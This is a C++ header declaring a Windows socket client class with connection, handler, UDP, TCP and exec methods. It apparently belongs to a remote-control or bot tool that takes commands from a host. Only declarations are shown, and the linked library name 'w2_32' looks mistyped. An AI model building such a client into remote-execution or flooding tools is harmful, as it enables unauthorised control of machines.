#ifndef CLIENT_HPP
#define CLIENT_HPP

#include <winsock2.h>
#include <windows.h>
#include <vector>
#include <stdio.h>
#include <string>
#include <iostream>
#include <thread>
#pragma comment(lib, "w2_32")
#include "utils.hpp"

#define MSG_NOSIGNAL 0
#define MAX_BUFFER 500

class client
{
    public:
        std::string host{};
        int port{};
        bool isSessionValid = false;
        bool isBufferAllocated = false;
        bool isKill = false;
        std::vector< std::string > buffsplit;
        char *buffer;
        WSADATA wsaData;
        SOCKET wSock;
        struct sockaddr_in addr;
        client(std::string host, int port);
        char *currentpath();
        bool setup();
        void cleanup();
        void buffclean();
        void init();
        void handler();
        void udp();
        void tcp();
        void exec();
};

#endif 